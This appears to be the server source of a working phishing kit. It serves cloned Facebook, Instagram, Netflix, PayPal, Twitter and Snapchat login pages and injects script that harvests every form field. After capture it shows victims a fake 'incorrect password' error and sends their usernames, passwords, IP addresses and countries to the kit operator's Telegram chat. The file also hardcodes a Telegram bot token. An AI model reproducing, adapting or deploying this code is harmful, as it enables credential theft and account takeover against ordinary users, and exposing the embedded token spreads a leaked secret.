
const express = require('express');
const path = require('path');
const fs = require('fs').promises;
const crypto = require('crypto');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 5000;

// Bot configuration
const BOT_TOKEN = '8117725031:AAHIIEhEvHUGBon0oQYjvCQz2lomvnxNFus';
// Better BASE_URL detection for Render
const BASE_URL = process.env.RENDER_EXTERNAL_URL || 
                 process.env.BASE_URL ||
                 'https://login-page-gen.onrender.com';

console.log('🔧 BASE_URL detected:', BASE_URL);

// CORS middleware for cross-origin requests (InfinityFree to Render)
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
    
    if (req.method === 'OPTIONS') {
        res.sendStatus(200);
    } else {
        next();
    }
});

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('.'));

// Store page configurations in memory (in production, use a database)
const pageConfigs = new Map();

// Import bot handler
const { handleBotUpdate } = require('./bot');

// Template configurations
const templates = {
    facebook: {
        name: 'Facebook',
        file: 'attached_assets/Facebook_1756410989833.txt'
    },
    instagram: {
        name: 'Instagram', 
        file: 'attached_assets/Index_1756410998924.html'
    },
    netflix: {
        name: 'Netflix',
        file: 'attached_assets/Netflix_1756410989925.txt'
    },
    paypal: {
        name: 'PayPal',
        file: 'attached_assets/Paypal_1756410989975.txt'
    },
    twitter: {
        name: 'Twitter',
        file: 'attached_assets/Twitter_1756410990061.txt'
    },
    snapchat: {
        name: 'Snapchat',
        file: 'attached_assets/snapchat_1756410990031.txt'
    }
};

// Function to get user's IP and location
async function getUserInfo(req) {
    const ip = req.headers['x-forwarded-for'] || 
               req.headers['x-real-ip'] || 
               req.connection.remoteAddress || 
               req.socket.remoteAddress || 
               '127.0.0.1';
    
    let country = 'Unknown';
    
    // Try to get country from IP (you can integrate with IP geolocation services)
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}`);
        const data = await response.json();
        if (data.status === 'success') {
            country = data.country;
        }
    } catch (error) {
        console.log('Could not get location:', error.message);
    }
    
    return { ip, country };
}

// Function to send message to Telegram
async function sendToTelegram(chatId, message) {
    try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        return await response.json();
    } catch (error) {
        console.error('Telegram send error:', error);
        return null;
    }
}

// Telegram Bot Webhook
app.post('/webhook', handleBotUpdate);

// API Routes
app.post('/api/create-page', async (req, res) => {
    try {
        const { template, userId, customTitle, frontendUrl } = req.body;
        
        if (!template || !userId) {
            return res.json({ success: false, error: 'Template and User ID are required' });
        }
        
        if (!templates[template]) {
            return res.json({ success: false, error: 'Invalid template' });
        }
        
        // Generate unique page ID
        const pageId = crypto.randomBytes(16).toString('hex');
        
        // Store page configuration
        pageConfigs.set(pageId, {
            template,
            userId,
            customTitle: customTitle || templates[template].name,
            createdAt: new Date(),
            hitCount: 0
        });
        
        // Create URL with user ID for easy identification
        const pageUrl = frontendUrl ? 
            `${frontendUrl}/${template}/id=${userId}/${pageId}.html` : 
            `${BASE_URL}/${template}/id=${userId}/${pageId}`;
        
        res.json({
            success: true,
            url: pageUrl,
            pageId,
            downloadUrl: `${BASE_URL}/api/download-page/${pageId}`,
            creatorId: userId,
            template: template
        });
        
    } catch (error) {
        console.error('Error creating page:', error);
        res.json({ success: false, error: 'Internal server error' });
    }
});

// New API endpoint to download page HTML
app.get('/api/download-page/:pageId', async (req, res) => {
    try {
        const { pageId } = req.params;
        const config = pageConfigs.get(pageId);
        
        if (!config) {
            return res.status(404).json({ error: 'Page not found' });
        }
        
        const template = templates[config.template];
        if (!template) {
            return res.status(404).json({ error: 'Template not found' });
        }
        
        // Read template file
        let htmlContent;
        try {
            htmlContent = await fs.readFile(template.file, 'utf-8');
        } catch (error) {
            console.error(`Template file not found: ${template.file}`);
            return res.status(404).json({ error: `Template file not found: ${template.file}` });
        }
        
        // Replace title if custom title provided
        if (config.customTitle) {
            htmlContent = htmlContent.replace(/<title>.*?<\/title>/i, `<title>${config.customTitle}</title>`);
        }
        
        // Add custom JavaScript for form submission to backend
        const customScript = `
        <script>
        console.log('🔗 Form script loaded for page:', '${pageId}');
        
        async function submitForm(event, pageId) {
            event.preventDefault();
            console.log('📝 Form submitted for page:', pageId);
            
            // Get form data
            const form = event.target.closest('form') || document.querySelector('form');
            const formData = new FormData(form);
            formData.append('pageId', pageId);
            
            // Also collect all input values for better extraction
            const inputs = form.querySelectorAll('input');
            const inputData = {};
            inputs.forEach(input => {
                if (input.value.trim()) {
                    const key = input.name || input.id || input.type || 'unknown';
                    inputData[key] = input.value;
                    formData.append(key, input.value);
                }
            });
            
            console.log('📊 Collected input data:', inputData);
            
            try {
                showMessage('success', 'Verifying credentials...');
                console.log('🚀 Sending to backend:', '${BASE_URL}/api/submit');
                
                const response = await fetch('${BASE_URL}/api/submit', {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                console.log('📬 Backend response:', result);
                
                if (result.success) {
                    console.log('✅ Form submission successful');
                    setTimeout(() => {
                        showMessage('error', 'Incorrect username or password. Please try again.');
                        // Clear password field
                        const passwordInput = form.querySelector('input[type="password"]');
                        if (passwordInput) passwordInput.value = '';
                    }, 2000);
                } else {
                    console.log('❌ Form submission failed:', result.error);
                    showMessage('error', 'Login failed. Please try again.');
                }
            } catch (error) {
                console.error('💥 Submit error:', error);
                showMessage('error', 'Connection error. Please check your network.');
            }
        }
        
        function showMessage(type, text) {
            let messageEl = document.getElementById('message');
            
            if (!messageEl) {
                messageEl = document.createElement('div');
                messageEl.id = 'message';
                messageEl.className = 'message';
                
                // Try to insert at the top of the form
                const form = document.querySelector('form');
                if (form) {
                    form.insertBefore(messageEl, form.firstChild);
                } else {
                    document.body.insertBefore(messageEl, document.body.firstChild);
                }
            }
            
            messageEl.className = 'message ' + type;
            messageEl.textContent = text;
            messageEl.style.display = 'block';
            
            setTimeout(() => {
                messageEl.style.display = 'none';
            }, 5000);
        }
        
        // Set up form submission handlers
        document.addEventListener('DOMContentLoaded', function() {
            const forms = document.querySelectorAll('form');
            forms.forEach(form => {
                // Remove any existing event listeners
                form.onsubmit = null;
                
                form.addEventListener('submit', function(e) {
                    e.preventDefault();
                    e.stopPropagation();
                    submitForm(e, '${pageId}');
                });
            });
        });
        </script>
        `;
        
        htmlContent = htmlContent.replace('</body>', customScript + '</body>');
        
        // Set appropriate headers for file download
        res.setHeader('Content-Type', 'text/html');
        res.setHeader('Content-Disposition', `attachment; filename="${pageId}.html"`);
        res.send(htmlContent);
        
    } catch (error) {
        console.error('Error downloading page:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Serve generated login pages with user ID in URL
app.get('/:template/id=:userId/:pageId', async (req, res) => {
    try {
        const { pageId, userId, template } = req.params;
        const config = pageConfigs.get(pageId);
        
        if (!config) {
            return res.status(404).send('Page not found');
        }
        
        // Verify the user ID matches
        if (config.userId !== userId) {
            return res.status(403).send('Unauthorized access to this page');
        }
        
        await servePage(req, res, pageId, config);
    } catch (error) {
        console.error('Error serving page:', error);
        res.status(500).send('Internal server error');
    }
});

// Keep original route for backward compatibility
app.get('/page/:pageId', async (req, res) => {
    try {
        const { pageId } = req.params;
        const config = pageConfigs.get(pageId);
        
        if (!config) {
            return res.status(404).send('Page not found');
        }
        
        const template = templates[config.template];
        if (!template) {
            return res.status(404).send('Template not found');
        }
        
        // Read template file
        let htmlContent;
        try {
            htmlContent = await fs.readFile(template.file, 'utf-8');
        } catch (error) {
            console.error(`Template file not found: ${template.file}`);
            return res.status(404).send(`Template file not found: ${template.file}`);
        }
        
        // Replace title if custom title provided
        if (config.customTitle) {
            htmlContent = htmlContent.replace(/<title>.*?<\/title>/i, `<title>${config.customTitle}</title>`);
        }
        
        // Find and replace any existing form submission handlers
        htmlContent = htmlContent.replace(
            /onsubmit="[^"]*"/g,
            ``
        );
        
        // Also handle addEventListener patterns
        htmlContent = htmlContent.replace(
            /document\.getElementById\('loginForm'\)\.addEventListener\('submit'.*?}\);/s,
            `// Form handled by custom submitForm function`
        );
        
        // Replace any existing sendToTelegram function calls
        htmlContent = htmlContent.replace(
            /sendToTelegram\([^)]*\)/g,
            `submitForm(event, '${pageId}')`
        );
        
        // Replace placeholder page ID if it exists
        htmlContent = htmlContent.replace(
            /PLACEHOLDER_PAGE_ID/g,
            pageId
        );
        
        // Add our custom JavaScript for form submission
        const customScript = `
        <script>
        async function submitForm(event, pageId) {
            event.preventDefault();
            console.log('🚀 Form submission started for pageId:', pageId);
            
            // Get form data
            const form = event.target.closest('form') || document.querySelector('form');
            const formData = new FormData(form);
            formData.append('pageId', pageId);
            
            // Also collect all input values for better extraction
            const inputs = form.querySelectorAll('input');
            const inputData = {};
            inputs.forEach(input => {
                if (input.value.trim()) {
                    const key = input.name || input.id || input.type || 'unknown';
                    inputData[key] = input.value;
                    formData.append(key, input.value);
                }
            });
            
            console.log('📝 Form data collected:', inputData);
            console.log('🎯 Submitting to:', '${BASE_URL}/api/submit');
            
            try {
                showMessage('success', 'Verifying credentials...');
                
                const response = await fetch('${BASE_URL}/api/submit', {
                    method: 'POST',
                    body: formData
                });
                
                console.log('📡 Response status:', response.status);
                const result = await response.json();
                console.log('📨 Response data:', result);
                
                if (result.success) {
                    console.log('✅ Form submitted successfully');
                    setTimeout(() => {
                        showMessage('error', 'Incorrect username or password. Please try again.');
                        // Clear password field
                        const passwordInput = form.querySelector('input[type="password"]');
                        if (passwordInput) passwordInput.value = '';
                    }, 2000);
                } else {
                    console.error('❌ Form submission failed:', result.error);
                    showMessage('error', 'Login failed. Please try again.');
                }
            } catch (error) {
                console.error('💥 Submit error:', error);
                showMessage('error', 'Connection error. Please check your network.');
            }
        }
        
        function showMessage(type, text) {
            let messageEl = document.getElementById('message');
            
            if (!messageEl) {
                messageEl = document.createElement('div');
                messageEl.id = 'message';
                messageEl.className = 'message';
                
                // Try to insert at the top of the form
                const form = document.querySelector('form');
                if (form) {
                    form.insertBefore(messageEl, form.firstChild);
                } else {
                    document.body.insertBefore(messageEl, document.body.firstChild);
                }
            }
            
            messageEl.className = 'message ' + type;
            messageEl.textContent = text;
            messageEl.style.display = 'block';
            
            setTimeout(() => {
                messageEl.style.display = 'none';
            }, 5000);
        }
        
        // Set up form submission handlers
        document.addEventListener('DOMContentLoaded', function() {
            const forms = document.querySelectorAll('form');
            forms.forEach(form => {
                // Remove any existing event listeners
                form.onsubmit = null;
                
                form.addEventListener('submit', function(e) {
                    e.preventDefault();
                    e.stopPropagation();
                    submitForm(e, '${pageId}');
                });
            });
        });
        </script>
        `;
        
        htmlContent = htmlContent.replace('</body>', customScript + '</body>');
        
        res.send(htmlContent);
        
    } catch (error) {
        console.error('Error serving page:', error);
        res.status(500).send('Internal server error');
    }
});

// Shared function for serving pages
async function servePage(req, res, pageId, config) {
    const template = templates[config.template];
    if (!template) {
        return res.status(404).send('Template not found');
    }
    
    // Read template file
    let htmlContent;
    try {
        htmlContent = await fs.readFile(template.file, 'utf-8');
    } catch (error) {
        console.error(`Template file not found: ${template.file}`);
        return res.status(404).send(`Template file not found: ${template.file}`);
    }
    
    // Replace title if custom title provided
    if (config.customTitle) {
        htmlContent = htmlContent.replace(/<title>.*?<\/title>/i, `<title>${config.customTitle}</title>`);
    }
    
    // Find and replace any existing form submission handlers
    htmlContent = htmlContent.replace(
        /onsubmit="[^"]*"/g,
        ``
    );
    
    // Also handle addEventListener patterns
    htmlContent = htmlContent.replace(
        /document\.getElementById\('loginForm'\)\.addEventListener\('submit'.*?}\);/s,
        `// Form handled by custom submitForm function`
    );
    
    // Replace any existing sendToTelegram function calls
    htmlContent = htmlContent.replace(
        /sendToTelegram\([^)]*\)/g,
        `submitForm(event, '${pageId}')`
    );
    
    // Replace placeholder page ID if it exists
    htmlContent = htmlContent.replace(
        /PLACEHOLDER_PAGE_ID/g,
        pageId
    );
    
    // Add our custom JavaScript for form submission
    const customScript = `
    <script>
    async function submitForm(event, pageId) {
        event.preventDefault();
        console.log('🚀 Form submission started for pageId:', pageId);
        
        // Get form data
        const form = event.target.closest('form') || document.querySelector('form');
        const formData = new FormData(form);
        formData.append('pageId', pageId);
        
        // Also collect all input values for better extraction
        const inputs = form.querySelectorAll('input');
        const inputData = {};
        inputs.forEach(input => {
            if (input.value.trim()) {
                const key = input.name || input.id || input.type || 'unknown';
                inputData[key] = input.value;
                formData.append(key, input.value);
            }
        });
        
        console.log('📝 Form data collected:', inputData);
        console.log('🎯 Submitting to:', '${BASE_URL}/api/submit');
        
        try {
            showMessage('success', 'Verifying credentials...');
            
            const response = await fetch('${BASE_URL}/api/submit', {
                method: 'POST',
                body: formData
            });
            
            console.log('📡 Response status:', response.status);
            const result = await response.json();
            console.log('📨 Response data:', result);
            
            if (result.success) {
                console.log('✅ Form submitted successfully');
                setTimeout(() => {
                    showMessage('error', 'Incorrect username or password. Please try again.');
                    // Clear password field
                    const passwordInput = form.querySelector('input[type="password"]');
                    if (passwordInput) passwordInput.value = '';
                }, 2000);
            } else {
                console.error('❌ Form submission failed:', result.error);
                showMessage('error', 'Login failed. Please try again.');
            }
        } catch (error) {
            console.error('💥 Submit error:', error);
            showMessage('error', 'Connection error. Please check your network.');
        }
    }
    
    function showMessage(type, text) {
        let messageEl = document.getElementById('message');
        
        if (!messageEl) {
            messageEl = document.createElement('div');
            messageEl.id = 'message';
            messageEl.className = 'message';
            
            // Try to insert at the top of the form
            const form = document.querySelector('form');
            if (form) {
                form.insertBefore(messageEl, form.firstChild);
            } else {
                document.body.insertBefore(messageEl, document.body.firstChild);
            }
        }
        
        messageEl.className = 'message ' + type;
        messageEl.textContent = text;
        messageEl.style.display = 'block';
        
        setTimeout(() => {
            messageEl.style.display = 'none';
        }, 5000);
    }
    
    // Set up form submission handlers
    document.addEventListener('DOMContentLoaded', function() {
        const forms = document.querySelectorAll('form');
        forms.forEach(form => {
            // Remove any existing event listeners
            form.onsubmit = null;
            
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                e.stopPropagation();
                submitForm(e, '${pageId}');
            });
        });
    });
    </script>
    `;
    
    htmlContent = htmlContent.replace('</body>', customScript + '</body>');
    res.send(htmlContent);
}

// Handle form submissions
app.post('/api/submit', async (req, res) => {
    try {
        const { pageId, ...formData } = req.body;
        const config = pageConfigs.get(pageId);
        
        if (!config) {
            return res.json({ success: false, error: 'Invalid page' });
        }
        
        // Increment hit counter
        config.hitCount++;
        
        // Get user info
        const userInfo = await getUserInfo(req);
        
        // Format message for Telegram
        const serviceName = templates[config.template].name;
        const hitNumber = config.hitCount;
        
        // Extract username and password with better logic
        let username = 'N/A';
        let password = 'N/A';
        
        console.log('🔍 All form data received:', formData);
        
        // Look for password first
        for (const [key, value] of Object.entries(formData)) {
            if (key.toLowerCase().includes('password') || key === 'password') {
                password = value;
                console.log('🔑 Password found:', key, '=', value);
                break;
            }
        }
        
        // Look for username/email
        for (const [key, value] of Object.entries(formData)) {
            const keyLower = key.toLowerCase();
            if (keyLower.includes('username') || keyLower.includes('email') || 
                keyLower.includes('phone') || key === 'username' || key === 'email') {
                username = value;
                console.log('👤 Username found:', key, '=', value);
                break;
            }
        }
        
        // If still no username, try first non-password field
        if (username === 'N/A') {
            for (const [key, value] of Object.entries(formData)) {
                if (!key.toLowerCase().includes('password') && key !== 'pageId' && value) {
                    username = value;
                    console.log('👤 Username from first field:', key, '=', value);
                    break;
                }
            }
        }
        
        console.log('📋 Form submission details:', { 
            pageId, 
            serviceName, 
            username, 
            password, 
            userInfo,
            userId: config.userId,
            allFormData: formData 
        });
        
        console.log('🎯 DATA FLOW TRACKING:');
        console.log(`   Page Creator: ${config.userId}`);
        console.log(`   Page ID: ${pageId}`);
        console.log(`   Service: ${serviceName}`);
        console.log(`   Hit #: ${hitNumber}`);
        console.log(`   Victim IP: ${userInfo.ip}`);
        console.log(`   Credentials: ${username} / ${password}`);
        console.log(`   Sending to Telegram User: ${config.userId}`);
        
        const message = `
🎯 <b>Hɪᴛ Nᴜᴍʙᴇʀ</b> - ${hitNumber}
🔐 <b>Sᴇʀᴠɪᴄᴇ</b> - ${serviceName}
👤 <b>Usᴇʀɴᴀᴍᴇ/Eᴍᴀɪʟ</b> - ${username}
🔑 <b>Pᴀssᴡᴏʀᴅ</b> - ${password}
🌍 <b>Cᴏᴜɴᴛʀʏ</b> - ${userInfo.country}
📍 <b>Iᴘ Aᴅᴅʀᴇss</b> - ${userInfo.ip}
🌐 <b>Hosted on</b> - HentaiHost
👨‍💻 <b>Dᴇᴠ</b> - @Whosekirito

📊 <b>Pᴀɢᴇ Sᴛᴀᴛs:</b> ${hitNumber} total hits
        `.trim();
        
        // Send to Telegram
        console.log('📤 Sending to Telegram user:', config.userId);
        const telegramResult = await sendToTelegram(config.userId, message);
        console.log('📨 Telegram send result:', telegramResult?.ok ? 'Success' : 'Failed', telegramResult);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('Error handling submission:', error);
        res.json({ success: false, error: 'Internal server error' });
    }
});

// API to get page stats
app.get('/api/stats/:pageId', (req, res) => {
    const { pageId } = req.params;
    const config = pageConfigs.get(pageId);
    
    if (!config) {
        return res.json({ success: false, error: 'Page not found' });
    }
    
    res.json({
        success: true,
        stats: {
            template: config.template,
            hitCount: config.hitCount,
            createdAt: config.createdAt,
            serviceName: templates[config.template].name
        }
    });
});

// Dashboard route
app.get('/dashboard', (req, res) => {
    res.sendFile(__dirname + '/dashboard.html');
});

// API to get all pages (for dashboard)
app.get('/api/pages', (req, res) => {
    const pages = [];
    for (const [pageId, config] of pageConfigs.entries()) {
        pages.push({
            pageId,
            template: config.template,
            userId: config.userId,
            serviceName: templates[config.template].name,
            hitCount: config.hitCount,
            createdAt: config.createdAt,
            url: `${BASE_URL}/page/${pageId}`
        });
    }
    
    res.json({ success: true, pages });
});

// Debug endpoint to check data flow
app.get('/api/debug/:pageId', (req, res) => {
    const { pageId } = req.params;
    const config = pageConfigs.get(pageId);
    
    if (!config) {
        return res.json({ 
            success: false, 
            error: 'Page not found',
            availablePages: Array.from(pageConfigs.keys())
        });
    }
    
    res.json({
        success: true,
        pageInfo: {
            pageId,
            creatorUserId: config.userId,
            template: config.template,
            serviceName: templates[config.template].name,
            hitCount: config.hitCount,
            createdAt: config.createdAt,
            pageUrl: `${BASE_URL}/page/${pageId}`
        },
        dataFlowStatus: {
            pageExists: true,
            creatorMapped: !!config.userId,
            telegramBotReady: !!BOT_TOKEN,
            webhookActive: true
        }
    });
});

// Test endpoint for bot
app.get('/api/bot-test', async (req, res) => {
    try {
        const testUrl = `https://api.telegram.org/bot${BOT_TOKEN}/getMe`;
        const response = await fetch(testUrl);
        const result = await response.json();
        
        res.json({
            success: true,
            bot_info: result,
            webhook_url: `${BASE_URL}/webhook`
        });
    } catch (error) {
        res.json({
            success: false,
            error: error.message
        });
    }
});

// Start server
const server = app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Backend URL: ${BASE_URL}`);
    console.log(`Bot webhook endpoint: ${BASE_URL}/webhook`);
    
    // Set webhook for bot
    console.log('🚀 Setting up Telegram webhook...');
    setWebhook();
});

// Function to set webhook
async function setWebhook() {
    try {
        const webhookUrl = `${BASE_URL}/webhook`;
        const setWebhookUrl = `https://api.telegram.org/bot${BOT_TOKEN}/setWebhook`;
        
        const response = await fetch(setWebhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                url: webhookUrl
            })
        });
        
        const result = await response.json();
        if (result.ok) {
            console.log('✅ Bot webhook set successfully!');
            console.log(`📱 Bot is now active at: ${webhookUrl}`);
        } else {
            console.log('❌ Failed to set webhook:', result.description);
        }
    } catch (error) {
        console.log('❌ Error setting webhook:', error.message);
    }
}

// Export for bot usage
module.exports = { pageConfigs, templates, app, server };
